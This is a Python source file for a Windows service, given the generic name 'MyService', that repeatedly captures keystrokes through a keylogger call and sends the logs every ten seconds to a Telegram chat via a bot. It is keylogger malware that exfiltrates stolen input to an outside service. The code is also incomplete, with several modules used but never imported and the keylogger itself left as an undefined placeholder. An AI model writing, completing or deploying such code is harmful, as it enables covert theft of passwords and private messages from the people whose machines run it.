import asyncio
import telegram
from telegram.ext import Updater

def send_telegram_message(bot, chat_id, text):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    future = asyncio.ensure_future(bot.send_message(chat_id=chat_id, text=text))
    loop.run_until_complete(future)

class MyService(win32serviceutil.ServiceFramework):
    _svc_name_ = "MyService"
    _svc_display_name_ = "My Service"
    _svc_description_ = "My Service Description"
    
    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.stop_event = win32event.CreateEvent(None, 0, 0, None)
        self.token = "YOUR_TELEGRAM_BOT_TOKEN"
        self.chat_id = "YOUR_CHAT_ID"
        self.bot = telegram.Bot(token=self.token)
        
    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.stop_event)
        
    def SvcDoRun(self):
        self.ReportServiceStatus(win32service.SERVICE_RUNNING)
        while True:
            # capture keystrokes and log them
            logs = keylogger.capture()
            # send logs via Telegram
            send_telegram_message(self.bot, self.chat_id, logs)
            # wait for some time before capturing keystrokes again
            time.sleep(10)
            if win32event.WaitForSingleObject(self.stop_event, 0) == win32event.WAIT_OBJECT_0:
                # stop service if stop event is set
                break
